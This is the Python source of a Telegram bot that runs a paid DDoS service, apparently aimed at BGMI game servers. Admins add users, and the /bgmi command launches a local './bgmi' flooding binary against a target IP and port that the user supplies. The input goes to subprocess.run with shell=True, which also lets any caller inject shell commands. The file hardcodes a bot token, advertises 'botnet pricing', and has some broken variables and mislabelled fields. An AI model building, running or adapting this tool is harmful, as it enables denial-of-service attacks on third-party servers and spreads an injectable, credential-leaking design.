import telebot
import os
import requests
import random
import subprocess
import datetime
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "7434130357:AAHvVWTbO2itPmHscv7bpG_eHuyDItbjGBU"
CHANNEL_1 = "bgmuii"  # First channel (without @)
CHANNEL_2 = "PRIMEXARMYDDOSS"  # Second channel (without @)
WAIT_TIME = 0  # Lockout time in seconds
IMAGE_FOLDER = "images"  # Folder where images are stored
admin_id = {"2109683176"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

bot = telebot.TeleBot(TOKEN)
user_lockout = {}  # Dictionary to store user wait times

# Function to check if user is in a channel
def is_user_in_channel(user_id, channel):
    try:
        chat_member = requests.get(
            f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id=@{channel}&user_id={user_id}"
        ).json()
        return chat_member["result"]["status"] in ["member", "administrator", "creator"]
    except:
        return False

# Function to send a random image with inline buttons
def send_random_image_with_buttons(chat_id, caption, markup):
    if os.path.exists(IMAGE_FOLDER) and os.listdir(IMAGE_FOLDER):
        image_file = os.path.join(IMAGE_FOLDER, random.choice(os.listdir(IMAGE_FOLDER)))  # Get random image
        with open(image_file, "rb") as photo:
            bot.send_photo(chat_id, photo, caption=caption, reply_markup=markup)
    else:
        bot.send_message(chat_id, caption, reply_markup=markup)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_id = message.from_user.id

    # Check if user is in the lockout period
    if user_id in user_lockout and time.time() - user_lockout[user_id] < WAIT_TIME:
        remaining_time = int(WAIT_TIME - (time.time() - user_lockout[user_id]))
        bot.send_message(chat_id, f"❌ You must join both channels first! Try again in {remaining_time} seconds.")
        return

    # Check if user has joined both channels
    in_channel_1 = is_user_in_channel(user_id, CHANNEL_1)
    in_channel_2 = is_user_in_channel(user_id, CHANNEL_2)

    if not (in_channel_1 and in_channel_2):  # If user is missing from either channel
        user_lockout[user_id] = time.time()  # Start lockout timer

        # Create inline buttons **stacked vertically**
        markup = InlineKeyboardMarkup(row_width=1)
        button1 = InlineKeyboardButton("📌 Join Channel 1", url=f"https://t.me/{CHANNEL_1}")
        button2 = InlineKeyboardButton("📌 Join Channel 2", url=f"https://t.me/{CHANNEL_2}")
        markup.add(button1)  # Button 1 on top
        markup.add(button2)  # Button 2 below it

        # Send image with inline buttons **attached to the same message**
        send_random_image_with_buttons(
            chat_id,
            "❌𝒀𝒐𝒖 𝒎𝒖𝒔𝒕 𝒋𝒐𝒊𝒏 𝒃𝒐𝒕𝒉 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔 𝒕𝒐 𝒖𝒔𝒆 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕.\n\n👇𝑪𝒍𝒊𝒄𝒌 𝒕𝒉𝒆 𝒃𝒖𝒕𝒕𝒐𝒏𝒔 𝒃𝒆𝒍𝒐𝒘 𝒕𝒐 𝒋𝒐𝒊𝒏:",
            markup
        )
        return

    # If user is in both channels, send a welcome image
    send_random_image_with_buttons(chat_id, "✅ Welcome! You have joined both channels and can now use the bot.\n\n for more information use /help ⬅️", None)

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =5

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                response = "You Are On Cooldown . Please Wait 5sec Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 310:
                response = "Error: Time interval must be less than 120."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 15 900"
                subprocess.run(full_command, shell=True)
                response = f"🟥BGMI Attack Finished.🟥\n☠️Target: {target}\n Port: {port} \nPort: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>\n\n Time Must be less then or equal to 300 sec"  # Updated command syntax
    else:
        response = " You Are Not Authorized To Use This Command ."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🚀 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐏𝐀𝐍𝐄𝐋 🚀


/bgmi – 𝐔𝐬𝐞 𝐟𝐨𝐫 𝐅*𝐜𝐤 𝐁𝐠𝐦𝐢 𝐒𝐞𝐫𝐯𝐞𝐫
/rules – 𝐑𝐞𝐚𝐝 𝐛𝐞𝐟𝐨𝐫𝐞 𝐮𝐬𝐢𝐧𝐠 𝐭𝐡𝐞 𝐛𝐨𝐭!
/mylogs – 𝐓𝐫𝐚𝐜𝐤 𝐲𝐨𝐮𝐫 𝐫𝐞𝐜𝐞𝐧𝐭 𝐚𝐭𝐭𝐚𝐜𝐤𝐬.
/plan – 𝐄𝐱𝐩𝐥𝐨𝐫𝐞 𝐨𝐮𝐫 𝐛𝐨𝐭𝐧𝐞𝐭 𝐩𝐫𝐢𝐜𝐢𝐧𝐠.


🔑 Admin Commands:
🔹 /admincmd – Unlock admin controls.


'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):  
    user_name = message.from_user.first_name  
    user_id = message.from_user.id  # Get user ID  
      
    response = f''' 
🚀Welcome to the Private Bot, \n
🟥 username: {user_name}!🚀\n
🟥 User ID:  {user_id}\n
🟥 To get started, try: /help\n
📌 Explore available features and commands.  
'''  
    bot.send_message(message.chat.id, response, parse_mode="Markdown")
    
@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''🔴{user_name}🔴 Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, HELLO. Content owner for plan details @Pk_Chopra
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐀𝐫𝐞 𝐇𝐞𝐫𝐞!!:

💥 /add <𝐮𝐬𝐞𝐫𝐈𝐝> : 𝐀𝐝𝐝 𝐚 𝐔𝐬𝐞𝐫.
💥 /remove <𝐮𝐬𝐞𝐫𝐈𝐝> : 𝐑𝐞𝐦𝐨𝐯𝐞 𝐚 𝐔𝐬𝐞𝐫.
💥 /allusers : 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐬𝐞𝐝 𝐔𝐬𝐞𝐫𝐬 𝐋𝐢𝐬𝐭𝐬.
💥 /log : 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫𝐬 𝐋𝐨𝐠𝐬.
💥 /broadcast  : 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐚 𝐌𝐞𝐬𝐬𝐚𝐠𝐞.
💥 /clearlogs : 𝐂𝐥𝐞𝐚𝐫 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐅𝐢𝐥𝐞.

'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)




#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
